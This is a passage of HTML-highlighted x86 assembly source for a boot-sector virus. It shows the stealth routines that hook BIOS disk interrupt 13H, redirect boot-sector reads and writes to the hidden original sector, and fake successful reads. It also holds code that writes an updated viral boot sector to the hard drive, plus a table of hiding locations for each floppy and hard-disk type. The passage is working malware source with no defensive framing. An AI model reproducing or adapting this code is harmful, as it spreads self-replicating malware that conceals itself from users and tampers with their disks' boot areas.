        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                              </span><span class="sc1">;# of bytes to read in dx:ax&lt;64K</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">;number of bytes to move in cx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">;fill buffer with 0's</span><span class="sc0">

        </span><span class="sc6">clc</span><span class="sc0">                                     </span><span class="sc1">;clear c, fake read successful</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                   </span><span class="sc1">;then restore everyting properly</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;first set flag register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;as stored on the stack</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;and pop all registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                                    </span><span class="sc1">;and get out</span><span class="sc0">

</span><span class="sc5">RB15</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;read next sectors on floppy</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                   </span><span class="sc1">;call BIOS to</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;read the rest (must use cs)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                   </span><span class="sc1">;use c flag from BIOS call</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;to set c flag on the stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RB2</span><span class="sc0">                             </span><span class="sc1">;if error, return ah from 2nd rd</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                          </span><span class="sc1">;else restore registers so</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">                              </span><span class="sc1">;it looks as if only one read</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;was performed</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;and exit with ah=0 to indicate</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;successful read</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">RB2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;error on 2nd read</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;so clean up stack</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">;and get out</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">RB_EXIT</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;exit from single sector read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;set the c flag on the stack</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;to indicate successful read</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;restore all registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                                    </span><span class="sc1">;and get out</span><span class="sc0">

</span><span class="sc5">RB_GOON</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;This passes control to BIOS</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;for uninfected disks</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;just restore all registers to</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                              </span><span class="sc1">;their original values</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;and go jump to BIOS</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This table identifies where the original boot sector is located for each</span><span class="sc0">
</span><span class="sc1">;of the various disk types. It is used by READ_BOOT and WRITE_BOOT to redirect</span><span class="sc0">
</span><span class="sc1">;boot sector reads and writes.</span><span class="sc0">

</span><span class="sc5">BOOT_SECTOR_LOCATION</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">40</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                          </span><span class="sc1">;Track, head, sector, 360K drive</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">80</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                          </span><span class="sc1">;1.2M drive</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">79</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                          </span><span class="sc1">;720K drive</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">79</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc0">                         </span><span class="sc1">;1.44M drive</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                           </span><span class="sc1">;Hard drive</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This routine handles writing the boot sector for all disks. It checks to see</span><span class="sc0">
</span><span class="sc1">;if the disk has been infected, and if not, allows BIOS to handle the write.</span><span class="sc0">
</span><span class="sc1">;If the disk is infected, this routine redirects the write to put the boot</span><span class="sc0">
</span><span class="sc1">;sector being written in the reserved area for the original boot sector. It</span><span class="sc0">
</span><span class="sc1">;must also handle the writing of multiple sectors properly, just as READ_BOOT</span><span class="sc0">
</span><span class="sc1">;did.</span><span class="sc0">

</span><span class="sc5">WRITE_BOOT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;save everything we might change</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                              </span><span class="sc1">;ds=es=cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_BOOT_SEC</span><span class="sc0">                    </span><span class="sc1">;read the real boot sector</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">WB01</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_BOOT_SEC</span><span class="sc0">                    </span><span class="sc1">;do it again if first failed</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">WB01</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">WB_GOON</span><span class="sc0">                         </span><span class="sc1">;error on read, let BIOS take it</span><span class="sc0">
</span><span class="sc5">WB01</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IS_VBS</span><span class="sc0">                          </span><span class="sc1">;else, is disk infected?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">WB02</span><span class="sc0">                            </span><span class="sc1">;yes</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">WB_GOON</span><span class="sc0">                         </span><span class="sc1">;no, let ROM BIOS write sector</span><span class="sc0">
</span><span class="sc5">WB02</span><span class="sc4">:</span><span class="sc1">;  mov     bx,OFFSET SCRATCHBUF + (OFFSET DR_FLAG - OFFSET BOOT_START)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SB_DR_FLAG</span><span class="sc0">        </span><span class="sc1">;required instead of ^ for a86</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                          </span><span class="sc1">;infected, so redirect the write</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">WB1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;make an index of the drive type</span><span class="sc0">
</span><span class="sc5">WB1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_SECTOR_LOCATION</span><span class="sc0">  </span><span class="sc1">;ax=@table entry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;get the location of original</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;boot sector on disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;prepare for the write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301H</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;and do it</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                          </span><span class="sc1">;was write going to hard drive?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">WB_15</span><span class="sc0">                           </span><span class="sc1">;no</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DR_FLAG</span><span class="sc4">],</span><span class="sc2">80H</span><span class="sc0">          </span><span class="sc1">;yes, update partition info</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PART</span><span class="sc0">                  </span><span class="sc1">;just move it from sec we just</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;wrote into the viral boot sec</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PART</span><span class="sc0"> 
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;switch ds and es around</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;and do the move</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301H</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;Track 0, Sector 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                          </span><span class="sc1">;drive 80H, Head 0</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                   </span><span class="sc1">;go write updated viral boot sec</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;with new partition info</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">;clean up</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">WB_15</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;was write more than 1 sector?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">WB_EXIT</span><span class="sc0">                         </span><span class="sc1">;if not, then exit</span><span class="sc0">

</span><span class="sc5">WRITE_1NEXT</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;more than 1 sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;see if it's the hard drive</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">WB_EXIT</span><span class="sc0">                         </span><span class="sc1">;if so, ignore rest of the write</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;floppy drive, go write the rest</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;as a second call to BIOS</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">;restore all registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                          </span><span class="sc1">;and modify a few to</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;drop writing the first sector</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;go write the rest</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                   </span><span class="sc1">;use c flag from call</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;to set c flag on the stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">WB2</span><span class="sc0">                             </span><span class="sc1">;an error</span><span class="sc0">
                                                </span><span class="sc1">;so exit with ah from 2nd int 13</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;else exit with ah=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;to indicate success</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">WB2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;exit with ah from 2nd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;interrupt</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc5">WB_EXIT</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;exit after 1st write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;set carry on stack to indicate</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;a successful write operation</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;restore all registers and exit</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
